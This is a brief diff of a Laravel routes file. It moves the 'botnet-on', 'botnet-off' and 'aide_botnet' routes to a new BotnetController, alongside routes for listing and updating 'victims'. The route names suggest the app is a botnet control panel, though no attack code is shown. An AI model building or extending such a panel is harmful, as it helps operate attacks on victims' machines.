@@ -40,11 +40,11 @@ Route::middleware(['auth'])->group(function () {
     Route::get('victims', [\App\Http\Controllers\VictimsController::class, 'index'])->name('victims.index');
     Route::put('victims/{id}', [\App\Http\Controllers\VictimsController::class, 'update'])->name('victims.update');
 
-    Route::post('botnet-on', [\App\Http\Controllers\HomeController::class, 'start_botnet']);
-    Route::post('botnet-off', [\App\Http\Controllers\HomeController::class, 'stop_botnet']);
 
 
-    Route::post('aide_botnet', [\App\Http\Controllers\HomeController::class, 'aide_botnet']);
+    Route::post('botnet-on', [\App\Http\Controllers\BotnetController::class, 'start_botnet']);
+    Route::post('botnet-off', [\App\Http\Controllers\BotnetController::class, 'stop_botnet']);
+    Route::post('aide_botnet', [\App\Http\Controllers\BotnetController::class, 'aide_botnet']);
 
 
 });
